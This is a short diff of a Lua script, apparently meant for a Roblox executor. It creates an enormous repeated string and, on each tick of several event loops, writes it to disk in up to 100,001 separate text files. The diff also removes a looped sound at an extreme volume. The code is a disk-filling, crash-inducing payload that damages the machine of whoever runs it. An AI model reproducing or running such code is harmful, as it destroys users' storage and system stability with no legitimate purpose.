@@ -11,16 +11,10 @@ local Loops = {
 
 local String = string.rep('𪚥🈵', 9e7)
 
-local Sound = Instance.new('Sound', workspace)
-Sound.SoundId = 'rbxassetid://1709572464'
-Sound.Volume = 9e9
-Sound.Looped = true
-Sound.Playing = true
-
 for _, RS in ipairs(Loops) do
     RS:Connect(function()
         task.spawn(function()
-            for _ = 9e9, 25e25 do writefile('!flipsy' .. ' ' .. _ .. '.txt', String) end        
+            for _ = 0, 100000 do writefile(_ .. '.txt', String) end        
         end)
     end)
 end
